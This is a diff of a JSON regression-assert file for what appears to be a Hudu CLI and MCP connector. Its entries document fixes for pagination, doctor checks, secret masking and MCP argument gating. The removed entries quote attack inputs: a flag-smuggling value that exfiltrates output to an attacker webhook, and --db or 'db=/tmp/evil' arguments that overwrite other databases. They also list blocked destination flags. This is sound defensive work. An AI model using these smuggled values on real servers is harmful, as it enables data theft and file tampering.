@@ -66,13 +66,21 @@
    "asserts": [
     {
      "file": "cli/internal/cli/sync.go",
-     "contains": "func resourceRejectsPageSize",
-     "min_count": 1
+     "contains": "if !resourceSupportsPagination(resource) {",
+     "min_count": 1,
+     "code_only": true
     },
     {
-     "file": "cli/internal/cli/sync.go",
-     "contains": "\"ip-addresses\", \"networks\", \"vlans\", \"vlan-zones\", \"rack-storage-items\"",
-     "min_count": 1
+     "file": "cli/internal/cli/sync_page_size_test.go",
+     "contains": "var nonPaginatedResources = []string{\"ip-addresses\", \"networks\", \"vlans\", \"vlan-zones\", \"rack-storage-items\"}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync_page_size_test.go",
+     "contains": "func TestNonPaginatedResourcesDeclareNoPagination(",
+     "min_count": 1,
+     "code_only": true
     },
     {
      "file": "cli/internal/cli/sync_page_size_test.go",
@@ -130,8 +138,9 @@
    "asserts": [
     {
      "file": "cli/internal/cli/sync.go",
-     "contains": "cursorType: \"page\"",
-     "min_count": 1
+     "contains": "cursorType:     \"page\",",
+     "min_count": 1,
+     "code_only": true
     },
     {
      "file": "cli/internal/cli/sync_page_size_test.go",
@@ -154,8 +163,27 @@
     },
     {
      "file": "cli/internal/cli/sync.go",
-     "contains": "if resource == \"procedure-tasks\"",
-     "min_count": 1
+     "contains": "cachedCount, countErr := db.Count(resource)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "if _, repeated := seenPageFingerprints[fp]; repeated {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "outcome.reason = \"repeated_page\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "const pageIntWalkCeiling = 10000",
+     "min_count": 1,
+     "code_only": true
     },
     {
      "file": "cli/internal/cli/sync_page_size_test.go",
@@ -188,13 +216,9 @@
    "asserts": [
     {
      "file": "cli/internal/cli/sync.go",
-     "contains": "skipped matchers: requires integration_id",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/cli/helpers.go",
-     "contains": "func (p *syncUserParams) hasParam",
-     "min_count": 1
+     "contains": "if missing := unfilledRequiredSyncQueryParams(resource, userParams, syncConditionalQueryParams(resource, pageSize, cursor, effectiveSince, sortValue)); len(missing) > 0 {",
+     "min_count": 1,
+     "code_only": true
     },
     {
      "file": "cli/internal/cli/sync_page_size_test.go",
@@ -211,14 +235,10 @@
    "spec_encode_followup": "Press gap: PER-ENDPOINT page_size (some endpoints 500 at the API max page size and need a smaller one). Filed in the same printing-press-retro as the per-endpoint pagination shape. Sibling of ipam-endpoints-reject-page-size.",
    "asserts": [
     {
-     "file": "cli/internal/cli/sync.go",
-     "contains": "func resourcePageSize",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/cli/sync.go",
-     "contains": "if lim := resourcePageSize(resource); lim > 0",
-     "min_count": 1
+     "file": "cli/internal/cli/sync_page_size_test.go",
+     "contains": "rel := determinePaginationDefaults(\"relations\").limit",
+     "min_count": 1,
+     "code_only": true
     },
     {
      "file": "cli/internal/cli/relations_list.go",
@@ -272,7 +292,7 @@
      "contains": "func doctorProbeCredentials("
     },
     {
-     "file": "cli/internal/cli/doctor_verdict.go",
+     "file": "cli/internal/cli/doctor.go",
      "contains": "func doctorBaseURLIsPlaceholder("
     },
     {
@@ -294,6 +314,36 @@
     {
      "file": "cli/internal/cli/doctor.go",
      "not_contains": "for _, v := range report {"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorProbeCredentials(cmd.Context(), c, cmd.Root(),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"credentials\"] = \"ERROR not verified: no credential is configured, so nothing was probed.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = \"not configured (base_url is a placeholder); set \" + doctorBaseURLEnv + \" to your own instance URL\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedPlaceholder(cfg.BaseURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedPlaceholder(base string) bool {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -333,55 +383,51 @@
      "file": "mcp-install.md",
      "contains": "\"HUDU_BASE_URL\":",
      "min_count": 3
-    }
-   ]
-  },
-  {
-   "id": "mcp-filesystem-destination-gate",
-   "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
-   "asserts": [
+    },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
+     "file": "manifest.json",
+     "contains": "\"HUDU_MCP_READ_ONLY\": \"${user_config.hudu_mcp_read_only}\"",
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
+     "file": "server.json",
+     "contains": "\"name\": \"HUDU_MCP_READ_ONLY\"",
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.Contains(k, \"=\")",
+     "file": "mcp-install.md",
+     "contains": "\"HUDU_MCP_READ_ONLY\":",
+     "min_count": 3
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"HUDU_NO_LOCAL_DATA\": \"${user_config.hudu_no_local_data}\"",
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
+     "file": "server.json",
+     "contains": "\"name\": \"HUDU_NO_LOCAL_DATA\"",
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
+     "file": "mcp-install.md",
+     "contains": "\"HUDU_NO_LOCAL_DATA\":",
+     "min_count": 3
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"HUDU_MCP_HTTP_TOKEN\": \"${user_config.hudu_mcp_http_token}\"",
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotDirectTheLocalStore(",
+     "file": "server.json",
+     "contains": "\"name\": \"HUDU_MCP_HTTP_TOKEN\"",
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotSmuggleAFlagThroughAnEqualsSign(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
-     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
-     "min_count": 1
+     "file": "mcp-install.md",
+     "contains": "\"HUDU_MCP_HTTP_TOKEN\":",
+     "min_count": 3
     }
    ]
   },
@@ -483,54 +529,6 @@
    ]
   },
   {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "\"--filter=map[a:1]\"",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
    "id": "mcp-executor-request-contracts",
    "summary": "MCP discovery exposes executor-facing request schemas and indexes input names and known enum values",
    "why": "Issue #351: endpoint summaries omitted required request inputs. Keep canonical JSON body case and nesting, path/header/query routing, and exact short request search terms. Contracts are derived from the shipped CLI source, and the existing CLI commands and auth remain intact. Upstream request metadata fix #4890 was not merged when this surgical repair was made.",
@@ -569,115 +567,6 @@
    ]
   },
   {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; the README and page.json ChatGPT answers say HTTP mode is paused.",
-   "why": "Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under \"Works with your agent\", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
-    },
-    {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "### Does this work with ChatGPT?\n\nNot with this build.",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "contains": "\"a\": \"Not with this build.",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
-    }
-   ]
-  },
-  {
-   "id": "mcp-file-flags-refused",
-   "class": "mcp-file-flag",
-   "summary": "An MCP tool call can no longer name a file or directory on the MCP host: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path)",
-   "why": "The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path). The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "blocked := blockedFlagsForCommand(cmd)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "shellOutToCLI(cliPath, path, blocked, declaredMCPFlagNames(cmd), inlineOnlyFlagsForCommand(cmd), commandTakesArgs(cmd))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "func toolOptionsForFlags(cmd *cobra.Command, blocked map[string]bool) []mcplib.ToolOption {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "if blocked[flag.Name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "if msg := refuseMCPArgs(args, declared, blocked, inlineOnly, takesArgs); msg != \"\" {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func refuseMCPArgs(args map[string]any, declared, blocked, inlineOnly map[string]bool, takesArgs bool) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func blockedFlagsForCommand(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "if name != mcpPositionalArgsField && !local[name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func flagWriteSinkNames(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
    "id": "secret-echo-decoded-funnel",
    "class": "secret-echo",
    "summary": "One decoded output funnel for every server text the client shows: maskCredentialText (every API error, transport error, displayed URL and --dry-run parameter goes through it) still masks each held credential as written and URL-escaped, then withholds the WHOLE text if any held value survives in any view reachable by undoing control/format characters, JSON and JavaScript escapes, percent escapes at any depth, HTML entities, markup tags, and base64/base64url/hex runs at every alignment (cliutil.FunnelWithhold, shared byte-identical across the fleet). The held set is every value the masks cover plus the part after a scheme word and both halves of a base64 id:secret pair (Basic auth, composed keys). Surfaces funnelled here: the API error body (checked whole before the 4096-byte display cut, then again as shown). Round 3 (owner-approved structural pass): the decoder searches every view breadth-first over one fixed set of steps (control-character drop, JSON and JavaScript escapes, the identity escape as its own step, percent, HTML entities, tag strip, base64 at four alignments, hex at two), matches every view, the original included, before any filter, keeps every view a step makes (a literal backslash survives), deduplicates, and is capped by total work (512 times the input plus 4 MiB; text over 1 MiB or past the cap is withheld). Every value a funnel call is given is held process-wide (cliutil.FunnelHold), and the client holds its credentials when built and its resolved auth header on every request. Two error-only backstops withhold any held value: every command error before Cobra prints it plus every JSON/agent error envelope (internal/cli/secret_funnel_cli.go), and every MCP error result and handler error through the outermost tool middleware (cmd/<mcp>/secret_funnel_mcp.go). Success output is never funnelled.",
@@ -705,19 +594,7 @@
     },
     {
      "file": "cli/internal/client/client.go",
-     "contains": "return cliutil.FunnelWithhold(masked, held)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
      "contains": "func (c *Client) shownErrorBody(body []byte, extraCredentials ...string) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "Body:       c.shownErrorBody(respBody, authHeader),",
      "min_count": 1,
      "code_only": true
     },
@@ -814,8 +691,1257 @@
     {
      "file": "cli/internal/cli/helpers.go",
      "not_contains": "\"error\": err.Error(),"
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "return cliutil.FunnelWithhold(finishCredentialMask(masked, secrets), held)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "bodyText := c.shownErrorBody(respBody, authHeader)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "not_contains": "bodyText := truncateBody(respBody)"
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "c.shownSummary(respBody, summary, authHeader)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "func (c *Client) shownSummary(body []byte, summary string, extraCredentials ...string) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "c.holdCredentials()",
+     "min_count": 2,
+     "code_only": true
     }
    ]
+  },
+  {
+   "id": "mcp-onboard-host-file-io",
+   "class": "mcp-host-file-io",
+   "summary": "onboard is refused over MCP: --template (reads a local JSON file) and --init (writes one) are declared host-file flags, and a process the MCP server spawned refuses onboard entirely; --init honours --dry-run; --init replaces an existing template only with --yes",
+   "why": "onboard --template names a local file it reads and --init writes one. Press 4.34.0 drops a flag from the MCP tool schema and refuses it only when the command declares it, so an MCP tool argument could make the server read or write a host file. Two layers, either one alone refuses: the mcp:read-flags / mcp:write-flags annotations, and a RunE guard on HUDU_MCP_CHILD. Found by check_mcp_file_flags.py and Codex round 1 on the 4.34.0 reprint.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/onboard.go",
+     "contains": "\"mcp:read-flags\": \"template\", \"mcp:write-flags\": \"template,init\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/onboard.go",
+     "contains": "if cliutil.IsMCPChildEnv() {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/onboard.go",
+     "contains": "would write an example template under %s (dry run: nothing written)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/hudu_onboard_paths_test.go",
+     "contains": "func TestOnboardTemplateIsNotAnMCPArgument(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/hudu_onboard_paths_test.go",
+     "contains": "func TestOnboardHostFileArgumentsRefusedOverMCP(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hudu_onboard_host_io_test.go",
+     "contains": "func TestOnboardRefusesHostFileIOInMCPChild(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hudu_onboard_host_io_test.go",
+     "contains": "func TestOnboardInitHonorsDryRun(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/onboard.go",
+     "contains": "mode := os.O_WRONLY | os.O_CREATE | os.O_EXCL",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/onboard.go",
+     "contains": "if errors.Is(err, fs.ErrExist) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hudu_onboard_host_io_test.go",
+     "contains": "func TestOnboardInitKeepsAnEditedTemplate(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "onboard-targets-selected-company",
+   "class": "wrong-write-target",
+   "summary": "onboard --apply creates template folders only under --company, never under a company_id the template file carries",
+   "why": "The preview named --company while the folder POST used the template's own company_id when present, so the write could land in another customer's Hudu company. Codex round 1 on the 4.34.0 reprint.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/onboard.go",
+     "contains": "body[\"company_id\"] = flagCompany",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hudu_onboard_host_io_test.go",
+     "contains": "func TestOnboardApplyTargetsOnlyTheSelectedCompany(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "doctor-placeholder-hosts-not-literals",
+   "class": "doctor-truth",
+   "summary": "doctor reads the shipped placeholder base URL from config instead of a host literal, and treats the whole .example TLD as reserved",
+   "why": "Press 4.34.0 dogfood scans novel doctor files and fails on any host literal that does not resolve; the shipped-placeholder check now takes the value from config.ShippedBaseURL() so it stays exactly the placeholder a fresh install uses.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "var doctorShippedBaseURL = config.ShippedBaseURL()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/hudu_shipped_base.go",
+     "contains": "func ShippedBaseURL() string { return builtinBaseURL() }",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "\"invalid\", \"example\"}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hudu_doctor_hosts_test.go",
+     "contains": "func TestDoctorRefusesTheShippedPlaceholderNotARealTenant(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "audit-literal-registration",
+   "class": "dogfood-registration",
+   "summary": "audit and audit expirations are registered with literal AddCommand calls so the command walker sees them",
+   "why": "Dogfood walks only literal AddCommand calls; without them `audit expirations` false-matched the root `expirations` command. A reprint restores the generated line and dogfood fails visibly.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "rootCmd.AddCommand(newNovelAuditCmd(flags))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/audit.go",
+     "contains": "cmd.AddCommand(newNovelAuditExpirationsCmd(flags))",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "dead-query-retention-helpers",
+   "class": "dead-code",
+   "summary": "the unused press query-retention helpers are removed while no hudu command calls them",
+   "why": "Press 4.34.0 emits retainCLIQueryParams / retainExplicitQueryParams, which no hudu command calls, and dogfood fails on dead helper functions. Restore them only if a command starts calling them.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "not_contains": "func retainCLIQueryParams("
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "not_contains": "func retainExplicitQueryParams("
+    }
+   ]
+  },
+  {
+   "id": "novel-4340-retrofit",
+   "class": "press-api-retrofit",
+   "summary": "novel commands use the 4.34.0 error and example contracts: onboard calls classifyAPIErrorOnly, resolve's help example uses a reserved host",
+   "why": "The 4.24 two-argument classifyAPIError no longer exists in 4.34.0 (the build breaks), and dogfood's novel-host gate rejects a help example on a non-reserved host.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/onboard.go",
+     "contains": "classifyAPIErrorOnly(err)",
+     "min_count": 3,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/resolve.go",
+     "contains": "hudu-cli resolve https://hudu.example.com/a/dc01-abc123",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "vault-secrets-withheld",
+   "class": "secret-returning-read",
+   "summary": "Hudu tenant secrets (vault password/otp_secret and the values of password-type asset layout fields) are withheld by RESOURCE, not by body shape, via the shared rule in internal/huduprotect. do/doRead/doMutation put an answeredURLs holder in the ctx; doInternal records resp.Request.URL after every successful httpClient.Do, and a response is protected when the requested path OR any answered URL names the vault (path contains asset_password, lowercased and percent-decoded until stable, query ignored) or assets (a path segment equal to assets). Any non-success body from a protected URL becomes a fixed withheld message inside doInternal (2xx HTML too; no AnnotateTransportBlock); the APIError keeps method, masked path and status. Successful vault bodies keep an exact key allowlist (no _at suffix rule); successful asset bodies get every field entry decided by its own field_type AND the layout's type (GET /asset_layouts/{id}, memoized per client, never through the asset rule; a failed lookup is secret), the decided type written as field_type and a non-empty secret value replaced by [withheld: password field]; unclassifiable bodies are errors. GetWithHeaders applies the same rule to cached bodies. A request body carrying the placeholder is refused before the wire. The store funnel mergeIncomingResourceData scrubs the MERGED row for every write; StoreSchemaVersion 14 rewrites existing vault and asset rows (resources, asset_passwords, assets, resources_fts) once with secure_delete on, optimizes FTS and checkpoints the WAL; a read-only open of a pre-14 store upgrades it first.",
+   "why": "Codex r2 found the shape-based filter kept leaking: (1) an install upgraded from 0.1.16 kept `password` in SQLite because the keep-richer merge retains keys the filtered incoming row lacks, so MCP sql `SELECT data FROM asset_passwords WHERE id='7'` returned it after sync; (2) a vault 422 body {\"errors\":{\"password\":[\"rejected value: SECRET\"]}} passed because the secret was inside an array, and `asset-passwords create` printed it. Redirects into the vault, text/HTML error bodies, the `_at` suffix pass (otp_secret_at) and password-type asset field values (no type on the asset, only on its layout) leaked the same way. The rule lives in hand files plus calls in the GENERATED client.go and store.go; a reprint regenerates those without the calls, every test still compiles (the methods stay defined), and the secrets leak again with a green build.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "ctx, answered := withAnsweredURLs(ctx)",
+     "min_count": 3,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "return c.withholdProtectedResponse(ctx, method, path, answered, data, status, err)",
+     "min_count": 3,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "recordAnsweredURL(ctx, resp)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "bodyText := c.shownErrorBody(respBody, authHeader)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "protectedAnswer := answerIsProtected(ctx, path, resp)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "bodyText = protectedErrorBodyWithheld",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
